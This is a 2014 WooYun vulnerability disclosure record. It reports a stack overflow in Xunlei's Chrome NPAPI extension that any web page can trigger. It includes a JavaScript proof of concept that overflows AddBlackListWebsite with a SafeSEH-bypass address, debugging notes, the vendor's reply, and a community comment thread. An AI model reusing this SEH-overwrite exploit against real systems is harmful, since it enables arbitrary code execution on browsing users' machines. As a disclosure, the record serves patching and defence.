{"id": 2196, "wybug_id": "wooyun-2014-060702", "wybug_title": "迅雷chrome插件栈溢出可导致执行任意代码", "wybug_corp": "迅雷", "wybug_author": "fate0", "wybug_date": "2014-05-14 14:49", "wybug_open_date": "2014-08-12 14:50", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["缓冲区溢出", "扩展"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-12：\t细节向公众公开  简要描述：       迅雷是迅雷公司开发的互联网下载软件。迅雷是一款基于多资源超线程技术的下载软件.安装迅雷时,向导会建议用户安装相关浏览器扩展,其中chrome浏览器下的Thunder Download Extension for Chrome扩展(简称迅雷chrome扩展)存在栈溢出漏洞,安装了迅雷chrome扩展的用户在浏览恶意网页时,可能执行任意代码. thanks: 金龟子 详细说明：  版本：\n\n 测试环境： win 2003 默认配置查看迅雷chrome扩展manifest.json文件时,发现该扩展使用了NPAPI(Netscape Plugin Application Programming Interface，网景插件应用程序接口)实现了xl_chrome.dll, 并且public属性为true,所以xl_chrome可以被任意网页调用.\n\nPOC:\n<embed type=\"application/xl_chrome_plugin\" id=\"xl_chrome_plugin\"><script>   var plugin = document.getElementById(\"xl_chrome_plugin\");    function exploit() {  \tvar i = 0;\tvar exploit_string = '';\tvar nop = '\\x72\\x00\\x72\\x00';  // jz next_code;\tvar safeseh_addr = '\\x0b\\x0b\\x27\\x00'; // call [ebp+30h]\tvar jz_seh_addr = '\\x74\\x22\\x74\\x22'; // skip seh\twhile (i < 20012) {\t\ti += 1;\t\texploit_string += 'a';\t}\texploit_string += jz_seh_addr;\texploit_string += safeseh_addr;\t\ti = 0;\twhile (i < 20000) {\t\ti += 1;\t\texploit_string += '\\x72\\x00\\x72\\x00'; // nop\t}\t\tplugin.AddBlackListWebsite(exploit_string);  }</script>// 大wooyun把一个正斜杠 替换成两个正斜杠了\nxl_chrome实现的AddBlackListWebsite存在栈溢出(AddBlackListPage应该也有，其他未作测试)利用mona查看程序相关保护\n\n嗯。。。需要bypass SafeSEH，查找bypass SafeSEH的地址\n\n最后选择0x00270b0b作为跳转地址命令行\nchrome.exe --plugin-startup-dialog\nImmunity Debugger 附加到chrome弹出对话框显示的进程id，chrome打开上面POC网页，F12打开console，输入exploit()   (为了方便调试写成一个函数)，会触发一个写异常\n\n忘记说了，因为程序带有GS，所以只能通过覆盖SafeSEH，触发异常来进入异常处理函数，这个时候异常链已经被我们覆盖成\n\n其中的0x00270B0B就是我们选取bypass SafeSEH的地址\n\n最后又回到了我们可控的地方\n\n剩下的就是shellcode的问题了   漏洞证明：     修复方案：  NPAPI，google早就说要弃用了吧，为什么大迅雷还敢继续用   版权声明：转载请注明来源 fate0@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-05-16 10:14 厂商回复： 感谢您的反馈，正在修正这个问题，另外弃用NPAPI插件是在我们的计划之中的，新插件还在测试中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-14 14:57 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  前排围观tar挂服务大牛    \n     2014-05-14 14:58 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  前排围观tar挂服务大牛    \n     2014-05-14 14:58 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  前排围观tar挂服务大牛    \n     2014-05-14 14:59 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  前排围观tar挂服务大牛    \n     2014-05-14 15:28 |    \t\tJinGuiZi \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:6        | 。。)\t\t \n  前排围观tar挂服务大牛    \n     2014-05-14 15:46 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:471 漏洞数:110        | X)\t\t \n  @肉肉 哇，肉肉大仙，现身了！出大事的节奏。。！    \n     2014-05-14 15:57 |    \t\t小新 \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:19        | 我可是要成为普通白帽子的小新)\t\t \n  @肉肉 哇，肉肉大仙，现身了！出大事的节奏。。！    \n     2014-05-14 15:58 |    \t\tyy520 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:12        )\t\t \n  @肉肉 哇，肉肉大仙，现身了！出大事的节奏。。！    \n     2014-05-14 15:58 |    \t\tfate0 \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:4        | hello from fate0)\t\t \n  @肉肉 哇，肉肉大仙，现身了！出大事的节奏。。！    \n     2014-05-14 16:08 |    \t\t银狼_avi \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:13        | 本屌十二岁破处)\t\t \n  @肉肉 哇，肉肉大仙，现身了！出大事的节奏。。！    \n     2014-05-14 16:09 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:471 漏洞数:110        | X)\t\t \n  @fate0 你要秒杀 猪猪侠吗？ 求带，大牛！4-100    \n     2014-05-14 16:14 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  @肉肉 哇，肉肉大仙，现身了！出大事的节奏。。！    \n     2014-05-14 16:18 |    \t\t肉肉  \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:10        | 肉肉在长亭科技，肉肉在长亭科技，肉肉在长...)\t\t \n  这是tar挂服务大牛主场哦，不要闹    \n     2014-05-14 16:30 |    \t\tComer \t\t\t( 普通白帽子  |\t\t\t        Rank:336 漏洞数:40        | 关注安全 | 关注智能漏洞挖掘)\t\t \n  这是tar挂服务大牛主场哦，不要闹    \n     2014-05-14 16:35 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  靠，赶紧保留版本，好好研究    \n     2014-05-14 16:46 |    \t\t冰冻冷咖啡 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 菜鸟一只)\t\t \n  围观大牛们    \n     2014-05-14 17:14 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-05-14 18:46 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  哇塞，大牛啊！你参加乌云众测了吗？    \n     2014-05-14 19:57 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  呜呜呜，大牛啊！你4个漏洞rank就100了！坑爹啊！    \n     2014-05-14 19:58 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @浅兮 可以一起玩均分wb的游戏    \n     2014-05-14 19:59 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  @xsser 不懂！你也很假啊！rank249怎么拿到核心白帽子了...    \n     2014-05-14 20:02 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @浅兮 ... 潜规则    \n     2014-05-14 20:04 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  @xsser 还是不懂！    \n     2014-05-15 02:37 |    \t\tvace \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:1        | 影子是一个会撒谎的精灵，它在虚空中流浪和...)\t\t \n  前排围观tar挂服务大牛     \n     2014-05-15 12:20 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  升土豪的节奏啊。不是精华就是现金。。。    \n     2014-05-16 10:42 |    \t\tHxai11 \t\t\t( 普通白帽子  |\t\t\t        Rank:1137 漏洞数:218        | 于是我们奋力向前游，逆流而上的小舟，不停...)\t\t \n  @xsser ....    \n     2014-05-16 11:41 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @光刃    \n     2014-05-19 11:54 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @xsser 不懂！你也很假啊！rank249怎么拿到核心白帽子了    \n     2014-05-19 18:28 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  @xsser 小吨吨，，你娃吭啊    \n     2014-05-24 00:16 |    \t\tstudy_vul \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 我有乌云id了，我马上就要牛叉起来了)\t\t \n  @xsser 不懂！你也很假啊！rank249怎么拿到核心白帽子了     \n     2014-06-05 13:23 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  87    \n     2014-08-12 16:19 |    \t\tdaige \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        )\t\t \n  金龟子。。。    \n     2014-08-12 17:17 |    \t\tchock \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:15        | 今夜我们都是wooyun人，我们一定要收购长亭)\t\t \n  难怪我的迅雷插件现在用不了了，看来迅雷公司停止了？    \n     2014-08-13 14:36 |    \t\tMy5t3ry \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        )\t\t \n  前排围观tar挂服务大牛     \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}